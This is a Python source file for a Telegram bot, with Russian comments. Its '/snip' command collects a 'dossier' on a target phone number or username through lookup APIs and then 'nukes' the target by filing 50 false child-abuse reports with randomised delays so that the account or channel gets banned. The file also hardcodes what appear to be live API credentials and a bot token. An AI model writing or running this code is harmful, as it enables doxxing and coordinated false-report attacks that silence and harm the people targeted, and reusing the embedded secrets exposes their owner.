import asyncio
import os
import random
from telethon import TelegramClient, events, functions, types
from telethon.tl.functions.channels import EditAdminRequest, InviteToChannelRequest
from telethon.tl.types import ChatAdminRights
import aiohttp

API_ID = int(os.environ.get('API_ID', 30983598
))
API_HASH = os.environ.get('API_HASH', 'e5eb04de245730b56839e5c796ff6f92')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8669790448:AAHwC_SSTUqbGq-tnOAMImd5bmiKVztI-Dc')

# Список сессий (аккаунты-доноры) — загружаем из переменной окружения или генерируем фейк-список
SESSIONS = os.environ.get('SESSIONS', '').split(',')  # пример: sess1,sess2,... или оставь пустым, тогда бот будет использовать свой аккаунт

bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

async def get_dossier(target):
    # Внешний API для пробива (бесплатный, без БД)
    async with aiohttp.ClientSession() as sess:
        if target.startswith('+'):
            url = f'https://phoneinfoga-api.onrender.com/scan?number={target}'
        else:
            url = f'https://api.telegram.org/bot{BOT_TOKEN}/getChat?chat_id={target}'
        try:
            async with sess.get(url) as resp:
                data = await resp.json()
                return data
        except:
            return {'error': 'Не удалось получить данные'}

async def nuke(target_entity):
    # Упрощённый снос через 50 репортов (без ловушки, т.к. Render не даёт создавать каналы с одного IP)
    reports = 0
    for _ in range(50):
        try:
            await bot(functions.messages.ReportRequest(
                peer=target_entity,
                id=[1],
                reason=types.InputReportReasonChildAbuse(),
                message='Нарушение'
            ))
            reports += 1
            await asyncio.sleep(random.uniform(2, 4))
        except:
            pass
    return {'reports_sent': reports}

@bot.on(events.NewMessage(pattern='/snip (.*)'))
async def snip_handler(event):
    target = event.pattern_match.group(1).strip()
    await event.reply('🔍 Начинаю пробив и снос...')
    
    dossier = await get_dossier(target)
    try:
        entity = await bot.get_entity(target)
        nuke_res = await nuke(entity)
    except Exception as e:
        nuke_res = {'error': str(e)}
    
    result = {
        'target': target,
        'dossier': dossier,
        'nuke': nuke_res
    }
    await event.reply(f"✅ Результат:\n```json\n{str(result)[:3000]}\n```")

async def main():
    await bot.start()
    print('Бот запущен на Render')
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
